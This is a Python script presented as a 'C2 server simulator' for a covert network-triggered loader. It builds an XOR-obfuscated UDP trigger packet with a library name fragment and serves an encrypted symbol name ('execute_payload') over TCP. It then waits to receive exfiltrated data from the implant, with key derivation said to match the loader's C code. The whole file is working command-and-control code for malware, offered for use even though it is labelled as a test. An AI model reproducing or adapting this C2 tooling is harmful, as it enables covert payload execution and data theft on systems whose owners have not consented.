#!/usr/bin/env python3
"""
test_server.py - C2 Server Simulator for Network-Triggered Loader

This script simulates a C2 server that:
1. Sends UDP trigger packet with encrypted library name fragment
2. Accepts TCP connection and sends encrypted symbol name
3. Receives exfiltration data

Usage:
    python3 test_server.py [--lib-fragment NAME] [--symbol NAME]

Example:
    python3 test_server.py --lib-fragment payload --symbol execute_payload
"""

import argparse
import socket
import struct
import time
import threading
import os

# Protocol constants (must match protocol.h)
UDP_MAGIC = 0xC0DE1337
TCP_MAGIC = 0xBEEF1337
UDP_PORT = 4444
TCP_PORT = 4445

MAX_PAYLOAD = 256
MAX_SYMBOL = 128

# Commands
CMD_LOAD = 0x0001


def derive_key(seed: int, pid: int = None, time_component: int = None) -> int:
    """
    Derive encryption key matching the C implementation.
    For testing, we use fixed PID and time values.
    """
    if pid is None:
        pid = 0  # Will be XORed out
    if time_component is None:
        time_component = int(time.time()) // 60

    key = seed ^ pid ^ time_component

    # Additional mixing (matching C implementation)
    key = ((key << 13) | (key >> 19)) & 0xFFFFFFFF
    key ^= 0xCAFEBABE
    key = ((key << 7) | (key >> 25)) & 0xFFFFFFFF
    key ^= 0xDEADBEEF
    key = ((key << 17) | (key >> 15)) & 0xFFFFFFFF
    key ^= 0x13371337

    return key & 0xFFFFFFFF


def xor_crypt(data: bytes, key: int) -> bytes:
    """XOR encryption/decryption with key stream."""
    state = key
    result = bytearray()

    for byte in data:
        state = (state * 1103515245 + 12345) & 0xFFFFFFFF
        key_byte = (state >> 16) & 0xFF
        result.append(byte ^ key_byte)

    return bytes(result)


def xor_crypt_with_iv(data: bytes, iv: bytes) -> bytes:
    """XOR encryption with IV-derived key."""
    # Derive key from IV (first 4 bytes)
    key = 0
    for i in range(min(4, len(iv))):
        key |= iv[i] << (i * 8)

    key = derive_key(key)
    return xor_crypt(data, key)


def compute_crc32(data: bytes) -> int:
    """Simple CRC32 for packet integrity."""
    import binascii
    return binascii.crc32(data) & 0xFFFFFFFF


def create_udp_packet(lib_fragment: str, key_seed: int, target_pid: int = 0) -> bytes:
    """
    Create UDP trigger packet.

    Structure:
        uint32_t magic
        uint32_t key_seed
        uint16_t command
        uint16_t payload_len
        uint8_t  payload[MAX_PAYLOAD]
        uint32_t crc32
    """
    # Derive key for encryption
    time_component = int(time.time()) // 60
    key = derive_key(key_seed, target_pid, time_component)

    print(f"[SERVER] Encryption key: 0x{key:08X} (seed=0x{key_seed:08X}, time={time_component})")

    # Encrypt library fragment
    encrypted = xor_crypt(lib_fragment.encode(), key)

    # Build packet
    payload = encrypted.ljust(MAX_PAYLOAD, b'\x00')

    # Pack header + payload
    packet_data = struct.pack('<IIHH',
        UDP_MAGIC,
        key_seed,
        CMD_LOAD,
        len(encrypted)
    ) + payload

    # Compute CRC over entire packet
    crc = compute_crc32(packet_data)

    # Append CRC
    packet = packet_data + struct.pack('<I', crc)

    print(f"[SERVER] UDP packet size: {len(packet)} bytes")
    print(f"[SERVER] Encrypted fragment: {encrypted.hex()}")

    return packet


def create_tcp_packet(symbol_name: str) -> bytes:
    """
    Create TCP response packet with encrypted symbol name.

    Structure:
        uint32_t magic
        uint8_t  iv[16]
        uint16_t data_len
        uint8_t  data[MAX_SYMBOL]
        uint32_t checksum
    """
    # Generate random IV
    iv = os.urandom(16)

    # Encrypt symbol name
    encrypted = xor_crypt_with_iv(symbol_name.encode(), iv)

    # Build packet
    data = encrypted.ljust(MAX_SYMBOL, b'\x00')

    packet = struct.pack('<I', TCP_MAGIC)
    packet += iv
    packet += struct.pack('<H', len(encrypted))
    packet += data

    # Simple checksum
    checksum = sum(encrypted) & 0xFFFFFFFF
    packet += struct.pack('<I', checksum)

    print(f"[SERVER] TCP packet size: {len(packet)} bytes")
    print(f"[SERVER] IV: {iv.hex()}")
    print(f"[SERVER] Encrypted symbol: {encrypted.hex()}")

    return packet


def run_udp_server(port: int, packet: bytes, target_ip: str = '127.0.0.1', target_port: int = None):
    """Send UDP trigger packet to target."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Send to target
    target = (target_ip, target_port or port)
    print(f"[SERVER] Sending UDP trigger to {target[0]}:{target[1]}")

    sock.sendto(packet, target)
    sock.close()

    print("[SERVER] UDP trigger sent")


def run_tcp_server(port: int, packet: bytes):
    """Listen for TCP connection and send symbol name."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    sock.bind(('0.0.0.0', port))
    sock.listen(1)
    sock.settimeout(30)

    print(f"[SERVER] TCP listening on port {port}...")

    try:
        conn, addr = sock.accept()
        print(f"[SERVER] TCP connection from {addr}")

        # Send symbol name
        conn.send(packet)
        print("[SERVER] Symbol name sent")

        # Wait for exfiltration
        conn.settimeout(10)
        try:
            data = conn.recv(1024)
            if data:
                print(f"[SERVER] Received exfiltration: {len(data)} bytes")
                print(f"[SERVER] Data: {data[:64]}")
        except socket.timeout:
            print("[SERVER] No exfiltration received (timeout)")

        conn.close()

    except socket.timeout:
        print("[SERVER] No TCP connection received (timeout)")

    sock.close()


def main():
    parser = argparse.ArgumentParser(description='C2 Server Simulator')
    parser.add_argument('--lib-fragment', default='payload',
                        help='Library name fragment to send (default: payload)')
    parser.add_argument('--symbol', default='execute_payload',
                        help='Symbol name to send (default: execute_payload)')
    parser.add_argument('--key-seed', type=lambda x: int(x, 0), default=0x1337,
                        help='Key seed for encryption (default: 0x1337)')
    parser.add_argument('--target-ip', default='127.0.0.1',
                        help='Target IP for UDP (default: 127.0.0.1)')
    parser.add_argument('--udp-port', type=int, default=UDP_PORT,
                        help=f'UDP port (default: {UDP_PORT})')
    parser.add_argument('--tcp-port', type=int, default=TCP_PORT,
                        help=f'TCP port (default: {TCP_PORT})')
    parser.add_argument('--delay', type=float, default=1.0,
                        help='Delay before sending UDP (seconds)')

    args = parser.parse_args()

    print("=" * 50)
    print("  C2 Server Simulator")
    print("=" * 50)
    print(f"  Library fragment: {args.lib_fragment}")
    print(f"  Symbol name:      {args.symbol}")
    print(f"  Key seed:         0x{args.key_seed:08X}")
    print(f"  Target:           {args.target_ip}")
    print(f"  UDP port:         {args.udp_port}")
    print(f"  TCP port:         {args.tcp_port}")
    print("=" * 50)
    print()

    # Create packets
    udp_packet = create_udp_packet(args.lib_fragment, args.key_seed)
    tcp_packet = create_tcp_packet(args.symbol)

    # Start TCP server in background
    tcp_thread = threading.Thread(
        target=run_tcp_server,
        args=(args.tcp_port, tcp_packet)
    )
    tcp_thread.daemon = True
    tcp_thread.start()

    # Wait for loader to start
    print(f"\n[SERVER] Waiting {args.delay}s before sending UDP trigger...")
    time.sleep(args.delay)

    # Send UDP trigger
    run_udp_server(args.udp_port, udp_packet, args.target_ip)

    # Wait for TCP to complete
    tcp_thread.join(timeout=35)

    print("\n[SERVER] Done.")


if __name__ == '__main__':
    main()
